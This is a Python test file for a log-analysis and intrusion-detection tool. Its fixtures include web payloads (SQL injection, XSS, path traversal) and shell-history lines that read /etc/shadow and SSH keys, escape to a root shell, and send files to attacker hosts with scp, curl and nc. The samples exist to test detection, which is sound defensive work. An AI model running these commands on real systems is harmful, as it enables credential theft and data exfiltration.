from _support import *


class ParserRegressionTests(unittest.TestCase):
    def test_collect_files_prunes_hidden_dirs_and_symlink_escapes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "case"
            root.mkdir()
            inside = root / "auth.log"
            inside.write_text("Mar 15 10:01:00 host sshd: accepted password\n", encoding="utf-8")
            shell_history = root / ".bash_history"
            shell_history.write_text("id\ncat /etc/shadow\n", encoding="utf-8")
            hidden_dir = root / ".git"
            hidden_dir.mkdir()
            hidden_file = hidden_dir / "config"
            hidden_file.write_text("secret=1\n", encoding="utf-8")
            outside = Path(tmp) / "outside.log"
            outside.write_text("should not be collected through a symlink\n", encoding="utf-8")
            link = root / "linked-outside.log"
            try:
                link.symlink_to(outside)
                symlink_available = True
            except (OSError, NotImplementedError):
                symlink_available = False

            files = collect_files([str(root)])

        self.assertIn(str(inside), files)
        self.assertIn(str(shell_history), files)
        self.assertNotIn(str(hidden_file), files)
        if symlink_available:
            self.assertNotIn(str(link), files)

    def test_web_payload_with_spaces_is_detected_as_sqli(self):
        content = (
            "1.1.1.1 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /login.php?id=1 UNION SELECT NULL-- HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )

        result = parse_web_access(content, "access.log")
        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.events[0].rule_name, "SQL注入")

        summary = run_detection(result.events)
        self.assertTrue(any(alert.rule_name == "Web攻击: SQL注入" for alert in summary.alerts))

    def test_web_attack_ip_can_still_create_volume_alert(self):
        content = "".join(
            "198.51.100.30 - - [15/Mar/2024:10:00:%02d +0800] "
            "\"GET /login.php?id=1%%20UNION%%20SELECT%%20NULL-- HTTP/1.1\" 200 10 \"-\" \"sqlmap\"\n" % (i % 60)
            for i in range(120)
        )

        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)

        self.assertTrue(any(event.category == "流量异常" for event in result.events))
        self.assertTrue(any(alert.rule_name.startswith("Web攻击:") for alert in summary.alerts))
        self.assertTrue(any(alert.rule_id == "RECON-003" for alert in summary.alerts))

    def test_windows_event_with_malformed_logon_type_is_not_dropped(self):
        xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">1.2.3.4</Data>"
            "<Data Name=\"LogonType\">-</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4625")
        self.assertEqual(event.user, "bob")

    def test_windows_4624_without_source_ip_stays_in_general_parser(self):
        xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
        )

        event = _parse_xml_event(xml, "Security.xml")

        self.assertIsNotNone(event)
        self.assertEqual(event.event_id, "4624")
        self.assertEqual(event.user, "alice")

    def test_windows_successful_logon_feeds_cn_hvv_success_after_bruteforce(self):
        xml = "".join(
            "<Event><System><EventID>4625</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            for i in range(5)
        )
        xml += (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:00.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
        )

        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events, profile="cn-hvv")

        self.assertTrue(any("successful-login" in event.tags for event in result.events if event.event_id == "4624"))
        self.assertTrue(any(alert.rule_id == "CN-HVV-002" for alert in summary.alerts))

    def test_evtx_missing_python_evtx_blocks_empty_report(self):
        with tempfile.TemporaryDirectory() as tmp:
            evtx_path = Path(tmp) / "Security.evtx"
            evtx_path.write_bytes(b"ElfFile\x00\x00")

            real_import = __import__

            def fake_import(name, globals=None, locals=None, fromlist=(), level=0):
                if name.startswith("Evtx"):
                    raise ImportError("No module named Evtx")
                return real_import(name, globals, locals, fromlist, level)

            with mock.patch("builtins.__import__", side_effect=fake_import):
                with self.assertRaises(AnalysisError) as ctx:
                    run_analysis(AnalysisOptions(paths=[str(evtx_path)]), quiet=True)

        msg = str(ctx.exception)
        self.assertIn("python-evtx", msg)
        self.assertIn("未被解析", msg)

    def test_parse_files_surfaces_partial_file_failures(self):
        ok = ParseResult("ok.log", "Fixture", [
            LogEvent(
                id="ok-1",
                timestamp="2024-03-15T10:00:00",
                level=ThreatLevel.INFO,
                category="测试",
                source="fixture",
                source_file="ok.log",
                message="ok",
                raw_line="ok",
            )
        ], ParseStats(total=1))
        errors = []

        with mock.patch("bla.core.pipeline.auto_parse", side_effect=[ok, RuntimeError("boom")]):
            results = parse_files(["ok.log", "bad.log"], jobs=0, quiet=True, errors_out=errors)

        self.assertEqual(results, [ok])
        self.assertEqual(len(errors), 1)
        self.assertIn("bad.log", errors[0])
        self.assertIn("boom", errors[0])

    def test_windows_system_account_creation_is_not_persistence_alert(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:33.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">WDAGUtilityAccount</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data>"
            "<Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("account-creation", event.tags)
        self.assertEqual(event.details.get("account_sensitivity"), "system-initialization")

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PERS-003" for alert in summary.alerts))

    def test_windows_low_risk_group_add_does_not_raise_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T14:16:40.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Users</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1001</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertNotIn("privilege-escalation", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "low")
        self.assertIn("S-1-5-21-1-2-3-1001", event.message)

        summary = run_detection([event])
        self.assertFalse(any(alert.rule_id == "PRIV-001" for alert in summary.alerts))

    def test_windows_admin_group_add_keeps_operator_and_privilege_alert(self):
        xml = (
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberName\">-</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("group-add", event.tags)
        self.assertEqual(event.details.get("group_sensitivity"), "privileged")
        self.assertIn("Builtin\\Administrators", event.message)

        summary = run_detection([event])
        alert = next(a for a in summary.alerts if a.rule_id == "PRIV-001")
        self.assertTrue(any("Administrator" in item for item in alert.evidence))
        self.assertTrue(any("目标组: Builtin\\Administrators" in item for item in alert.evidence))

    def test_windows_new_admin_account_remote_logon_chain_becomes_incident(self):
        xml = (
            "<Event><System><EventID>4720</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"TargetSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4722</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:13.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4724</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:14.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4732</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:01:37.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">Administrators</Data>"
            "<Data Name=\"TargetDomainName\">Builtin</Data>"
            "<Data Name=\"MemberSid\">S-1-5-21-1-2-3-1002</Data>"
            "<Data Name=\"SubjectUserName\">Administrator</Data>"
            "<Data Name=\"SubjectDomainName\">WIN-N8G63QC50SQ</Data></EventData></Event>"
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"Workstation\">CHINARAN404</Data>"
            "<Data Name=\"Status\">0x0</Data></EventData></Event>"
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN-N8G63QC50SQ</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">hack168$</Data>"
            "<Data Name=\"TargetDomainName\">WIN-N8G63QC50SQ</Data>"
            "<Data Name=\"IpAddress\">192.168.126.1</Data>"
            "<Data Name=\"WorkstationName\">CHINARAN404</Data>"
            "<Data Name=\"LogonType\">10</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events)

        chain = next(alert for alert in summary.alerts if alert.rule_id == "WIN-CHAIN-001")
        self.assertEqual(chain.level, ThreatLevel.CRITICAL)
        self.assertTrue(any("来源IP: 192.168.126.1" in item for item in chain.evidence))
        self.assertTrue(any("来源工作站: CHINARAN404" in item for item in chain.evidence))
        top = summary.incidents[0]
        self.assertIn("可疑本地管理员账号与远程登录", top.title)
        self.assertEqual(top.confidence, "high")
        self.assertIn("192.168.126.1", top.source_ips)
        self.assertIn("WIN-N8G63QC50SQ\\hack168$", top.accounts)
        self.assertIn("持久化", top.attack_phases)
        self.assertIn("权限提升", top.attack_phases)
        self.assertIn("远程访问", top.attack_phases)

    def test_windows_4688_process_creation_is_not_generic_t1059(self):
        xml = (
            "<Event><System><EventID>4688</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:24.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"NewProcessName\">C:\\Windows\\System32\\smss.exe</Data>"
            "<Data Name=\"ParentProcessName\">System</Data>"
            "<Data Name=\"CommandLine\">smss.exe</Data></EventData></Event>"
        )
        result = parse_windows_xml(xml, "Security.xml")
        event = result.events[0]
        self.assertIsNone(event.mitre_attack)
        self.assertIn("process-creation", event.tags)

        summary = run_detection(result.events)
        self.assertFalse(any(item.phase == "执行" for item in summary.attack_chain))

    def test_windows_ntlm_success_zero_status_is_not_bruteforce(self):
        xml = (
            "<Event><System><EventID>4776</EventID>"
            "<TimeCreated SystemTime=\"2024-02-26T15:02:22.000Z\"/>"
            "<Computer>WIN</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"Workstation\">WS01</Data>"
            "<Data Name=\"Status\">0x00000000</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.INFO)
        self.assertIn("auth-success", event.tags)
        self.assertIsNone(event.mitre_attack)

    def test_windows_4771_feeds_bruteforce_detection(self):
        xml = "".join(
            "<Event><System><EventID>4771</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"IpAddress\">198.51.100.77</Data></EventData></Event>"
            for i in range(5)
        )

        result = parse_windows_xml(xml, "Security.xml")
        summary = run_detection(result.events)

        self.assertTrue(all("failed-login" in event.tags for event in result.events))
        self.assertTrue(any(alert.rule_id == "BRUTE-001" for alert in summary.alerts))

    def test_simple_yaml_regex_quotes_do_not_emit_escape_warnings(self):
        text = """
web_attacks:
  - id: WEB-WARN
    name: warning fixture
    level: high
    mitre: T1190
    tags: [web-attack]
    patterns:
      - '\\$\\{jndi:'
      - 'openapi\\.json'
"""
        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            data = _parse_simple_yaml(text)

        self.assertEqual(data["web_attacks"][0]["patterns"][0], "\\$\\{jndi:")
        self.assertFalse(any(item.category is SyntaxWarning for item in caught))

    def test_local_machine_explicit_creds_do_not_become_pass_the_hash(self):
        xml = "".join(
            "<Event><System><EventID>4648</EventID>"
            f"<TimeCreated SystemTime=\"2026-05-13T00:44:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"SubjectUserName\">MINWINPC$</Data>"
            "<Data Name=\"SubjectDomainName\">WIN</Data>"
            "<Data Name=\"TargetServerName\">localhost</Data>"
            "<Data Name=\"TargetUserName\">MINWINPC$</Data>"
            "<Data Name=\"TargetDomainName\">WIN</Data></EventData></Event>"
            for i in range(3)
        )
        result = parse_windows_xml(xml, "Security.xml")
        self.assertEqual(len(result.events), 3)
        self.assertTrue(all("local-explicit-creds" in event.tags for event in result.events))
        self.assertTrue(all("explicit-creds" not in event.tags for event in result.events))

        summary = run_detection(result.events)
        self.assertFalse(any(alert.rule_id == "LAT-002" for alert in summary.alerts))

    def test_syslog_year_can_be_overridden_for_historical_logs(self):
        try:
            set_syslog_year(2024)
            self.assertEqual(normalize_timestamp("Mar 15 09:00:01"), "2024-03-15T09:00:01")
        finally:
            set_syslog_year(None)

    def test_cross_year_syslog_lines_advance_year_on_month_rollback(self):
        """12 月之后出现 1 月份事件，应自动 +1 年。"""
        content = (
            "Dec 31 23:59:59 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
            "Jan 01 00:00:01 host sshd[1]: Failed password for u1 from 1.1.1.1 port 22 ssh2\n"
        )
        # 显式指定 2024 起点，便于断言
        set_syslog_year(2024)
        try:
            result = parse_linux_auth(content, "auth.log")
        finally:
            set_syslog_year(None)
        timestamps = sorted(e.timestamp for e in result.events)
        self.assertTrue(timestamps[0].startswith("2024-12-31"))
        self.assertTrue(timestamps[-1].startswith("2025-01-01"))

    def test_windows_eventid_4740_account_lockout_recognized(self):
        """4740 账户锁定应被识别为 HIGH 级账户管理事件。"""
        xml = (
            "<Event><System><EventID>4740</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>dc1</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">alice</Data>"
            "<Data Name=\"TargetDomainName\">CORP</Data></EventData></Event>"
        )
        event = _parse_xml_event(xml, "Security.xml")
        self.assertIsNotNone(event)
        self.assertEqual(event.level, ThreatLevel.HIGH)
        self.assertIn("account-lockout", event.tags)

    def test_windows_xml_parse_errors_are_counted_not_silenced(self):
        """损坏的 XML 块应进入 parse_errors 而不是被静默吞掉。"""
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        # 故意构造一个无法解析的 XML（属性引号未闭合）
        bad_xml = "<Event><System><EventID>4625</EventID><Bad attr=\"unclosed></System></Event>"
        result = parse_windows_xml(good_xml + "\n" + bad_xml, "Security.xml")
        self.assertEqual(len(result.events), 1)
        self.assertGreaterEqual(result.stats.parse_errors, 1)

    def test_generic_parser_warns_when_truncating(self):
        """通用解析器超过行数限制必须打印 warning，不能静默丢数据。"""
        big_content = "\n".join(f"line {i:04d}: hello world" for i in range(10_500))
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            _parse_generic(big_content, "huge.log")
            stderr = sys.stderr.getvalue()
        finally:
            sys.stderr = old_stderr
        self.assertIn("截断", stderr)
        self.assertIn("10500", stderr.replace(",", ""))

    def test_parse_errors_strip_controls_and_redact_secrets(self):
        marker = "\x1b]52;c;SGFja2Vk\x07\x1b[31m"
        errors = []
        output = []

        def capture(*values, **_kwargs):
            output.append(" ".join(str(value) for value in values))

        with mock.patch(
            "bla.core.pipeline.auto_parse",
            side_effect=RuntimeError(f"{marker}boom access_token=super-secret"),
        ):
            with self.assertRaises(AnalysisError):
                parse_files([f"{marker}bad.log"], jobs=1, quiet=False, print_fn=capture, errors_out=errors)

        text = "\n".join(errors + output)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("SGFja2Vk", text)
        self.assertNotIn("super-secret", text)
        self.assertIn("access_token=<redacted>", text)
        self.assertIn("boom", text)

    def test_web_alert_preserves_highest_event_level(self):
        """Web 聚合告警不应把单条 HIGH 事件降成 MEDIUM。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
            "\"GET /search.php?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" "
            "200 10 \"-\" \"Mozilla/5.0\"\n"
        )
        result = parse_web_access(content, "access.log")
        summary = run_detection(result.events)
        alert = next(a for a in summary.alerts if a.rule_name == "Web攻击: XSS攻击")
        self.assertEqual(alert.level, ThreatLevel.HIGH)

    def test_auto_parse_streams_web_logs_from_file(self):
        """自动识别 Web 日志时应能直接从文件路径解析，并保留文件大小。"""
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(
                "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
                "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n",
                encoding="utf-8",
            )
            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Web Access Log (Apache/Nginx)")
        self.assertGreater(result.file_size_bytes, 0)
        self.assertEqual(result.events[0].rule_name, "路径遍历")

    def test_auto_parse_windows_xml_streams_from_file(self):
        """Windows XML 文件入口不应为了解析而整文件读入。"""
        xml = "".join(
            "<Event><System><EventID>4625</EventID>"
            f"<TimeCreated SystemTime=\"2024-03-15T01:02:{i:02d}.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data>"
            "<Data Name=\"IpAddress\">203.0.113.8</Data>"
            "<Data Name=\"LogonType\">3</Data></EventData></Event>"
            for i in range(3)
        )
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "Security.xml"
            path.write_text(xml, encoding="utf-8")
            with mock.patch("bla.parsers.read_file", side_effect=AssertionError("full read not allowed")):
                result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Windows Event Log (XML)")
        self.assertEqual(len(result.events), 3)
        self.assertGreater(result.file_size_bytes, 0)

    def test_auto_parse_generic_streams_from_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "unknown.log"
            path.write_text(
                "\n".join(
                    f"2024-03-15T10:00:{i:02d} error from 9.9.9.{i}"
                    for i in range(3)
                ) + "\n",
                encoding="utf-8",
            )
            with mock.patch("bla.parsers.read_file", side_effect=AssertionError("full read not allowed")):
                result = auto_parse(str(path), parser_name="generic")

        self.assertEqual(result.log_type, "通用日志")
        self.assertEqual(result.stats.total, 3)
        self.assertGreater(result.file_size_bytes, 0)

    def test_windows_xml_file_counts_trailing_incomplete_event(self):
        good_xml = (
            "<Event><System><EventID>4624</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:02:03.000Z\"/>"
            "<Computer>host</Computer><Channel>Security</Channel></System>"
            "<EventData><Data Name=\"TargetUserName\">bob</Data></EventData></Event>"
        )
        truncated_xml = (
            "<Event><System><EventID>4625</EventID>"
            "<TimeCreated SystemTime=\"2024-03-15T01:03:03.000Z\"/>"
        )
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "Security.xml"
            path.write_text(good_xml + truncated_xml, encoding="utf-8")
            result = parse_windows_xml_file(str(path), path.name)

        self.assertEqual(len(result.events), 1)
        self.assertEqual(result.stats.parse_errors, 1)

    def test_parser_registry_supports_explicit_type_and_content_input(self):
        """解析层应支持强制类型和内存内容，方便 Remote Collector 复用。"""
        content = (
            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
        )
        self.assertIn("web-access", list_parser_names())

        parsed = parse_content(content, "remote-host:/var/log/nginx/access.log")
        self.assertEqual(parsed.log_type, "Web Access Log (Apache/Nginx)")
        self.assertEqual(parsed.events[0].source_file, "remote-host:/var/log/nginx/access.log")

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "access.log"
            path.write_text(content, encoding="utf-8")
            forced = auto_parse(str(path), parser_name="generic")
        self.assertEqual(forced.log_type, "通用日志")

    def test_shell_history_parser_extracts_attack_commands(self):
        content = "\n".join([
            "ls -la",
            "whoami",
            "wget https://example.test/linux-exploit-suggester.sh -O les.sh",
            "sudo -l",
            "find / -type f -user root -perm -4000 2>/dev/null",
            "./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "cat /etc/shadow",
            "rm /var/www/html/uploads/x.phtml",
        ]) + "\n"

        result = parse_shell_history(content, ".bash_history")

        self.assertEqual(result.log_type, "Shell History")
        self.assertIn("shell-history", list_parser_names())
        self.assertEqual(result.stats.total, 7)
        tags = {tag for event in result.events for tag in event.tags}
        self.assertIn("tool-download", tags)
        self.assertIn("privilege-escalation", tags)
        self.assertIn("linux-credential-file", tags)
        self.assertIn("artifact-deletion", tags)
        commands = [event.details.get("command") for event in result.events]
        self.assertNotIn("ls -la", commands)

    def test_shell_history_parser_detects_ssh_and_app_secret_reads(self):
        content = "\n".join([
            "less ~/.ssh/id_rsa",
            "grep DB_PASSWORD /var/www/html/.env",
            "tail -50 /srv/app/config.php",
        ]) + "\n"

        result = parse_shell_history(content, ".zsh_history")

        self.assertEqual(result.stats.total, 3)
        self.assertEqual({event.rule_name for event in result.events}, {"Linux 敏感凭据文件读取"})
        self.assertEqual({event.details.get("action") for event in result.events}, {"credential-file-read"})
        self.assertIn("T1552.004", {event.mitre_attack for event in result.events})

    def test_shell_history_parser_detects_data_exfiltration_commands(self):
        content = "\n".join([
            "scp /var/backups/db.sql.gz attacker@198.51.100.10:/tmp/db.sql.gz",
            "rsync -az ./uploads attacker@198.51.100.10:/tmp/uploads",
            "curl --upload-file /tmp/secrets.tar.gz https://exfil.example/upload",
            "nc 198.51.100.11 4444 < /etc/passwd",
            "scp analyst@backup:/tmp/report ./report",
            r"scp /tmp/report C:\Users\alice\report",
        ]) + "\n"

        result = parse_shell_history(content, "server01:/home/alice/.bash_history")

        self.assertEqual(result.stats.total, 4)
        self.assertEqual({event.rule_name for event in result.events}, {"Shell 数据外传命令"})
        self.assertEqual({event.details.get("action") for event in result.events}, {"data-exfiltration"})
        tags = {tag for event in result.events for tag in event.tags}
        self.assertIn("shell-exfiltration", tags)
        self.assertIn("data-exfiltration", tags)
        self.assertEqual({event.mitre_attack for event in result.events}, {"T1041"})
        self.assertNotIn("analyst@backup:/tmp/report", [event.details.get("command") for event in result.events])

    def test_shell_history_parser_extracts_zsh_time_and_source_context(self):
        result = parse_shell_history(
            ": 1710500000:0;cat /etc/shadow\n",
            "server01:/home/alice/.zsh_history",
        )

        self.assertEqual(result.stats.total, 1)
        event = result.events[0]
        self.assertTrue(event.timestamp.endswith("+00:00"))
        self.assertEqual(event.user, "alice")
        self.assertEqual(event.host, "server01")
        self.assertEqual(event.details.get("account"), "alice")
        self.assertEqual(event.details.get("asset"), "server01")

    def test_parser_registry_detects_bash_history_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / ".bash_history"
            path.write_text("id\nsudo -l\ncat /etc/shadow\n", encoding="utf-8")

            result = auto_parse(str(path))

        self.assertEqual(result.log_type, "Shell History")
        self.assertEqual([event.rule_name for event in result.events], [
            "主机信息枚举",
            "提权命令痕迹",
            "Linux 敏感凭据文件读取",
        ])
